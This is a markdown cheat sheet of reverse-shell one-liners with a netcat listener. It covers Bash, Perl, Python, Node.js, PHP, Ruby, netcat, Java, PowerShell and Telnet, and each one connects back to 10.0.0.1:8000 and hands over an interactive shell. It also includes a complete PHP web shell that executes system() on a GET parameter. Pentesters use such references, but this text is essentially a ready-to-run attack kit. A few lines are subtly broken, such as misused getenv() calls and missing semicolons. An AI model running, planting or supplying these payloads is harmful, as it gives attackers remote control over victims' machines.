# Reverse shells
> A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the local host.

---

## Listener
### Netcat
```
nc -lvnp 8000
```

## Reverse shells
### Bash
```
bash -i >& /dev/tcp/10.0.0.1/8000 0>&1
```

### Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python 2
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
python -c 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv("10.0.0.1"),int(os.getenv("8000")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")'
```

### Python 3
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

### Nodejs
```
require('child_process').exec('nc -e sh 10.0.0.1 8000')
```

### PHP
```
php -r '$sock=fsockopen("10.0.0.1",8000);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```
php -r '$sock=fsockopen("10.0.0.1",8000);passthru("sh <&3 >&3 2>&3");'
```
```
php -r '$sock=fsockopen("10.0.0.1",8000);popen("sh <&3 >&3 2>&3", "r");'
```
```
php -r '$sock=fsockopen("10.0.0.1",8000);system("sh <&3 >&3 2>&3");'
```
```
php -r '$sock=fsockopen(getenv("10.0.0.1"),getenv("8000"));exec("/bin/sh -i <&3 >&3 2>&3");'
```
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8000).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat
```
nc -e /bin/sh 10.0.0.1 8000
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8000 >/tmp/f
```

### Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Powershell
```
powershell%20-nop%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient('10.0.0.1',8000);$stream%20=%20$client.GetStream();%5Bbyte%5B%5D%5D$bytes%20=%200..65535%7C%25%7B0%7D;while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200)%7B;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&1%20%7C%20Out-String%20);$sendback2%20=%20$sendback%20+%20'PS%20'%20+%20(pwd).Path%20+%20'%3E%20';$sendbyte%20=%20(%5Btext.encoding%5D::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()%7D;$client.Close()%22
```

### Telnet
```
TF=$(mktemp -u); mkfifo $TF && telnet 10.0.0.1 8000 0<$TF | /bin/sh 1>$TF
```

---

## 📚 References
- [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [github.com/LasCC/Hack-Tools](https://github.com/LasCC/Hack-Tools)
- [netsparker.com/blog/web-security/understanding-reverse-shells/](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/)
- [revshells.com](https://www.revshells.com/)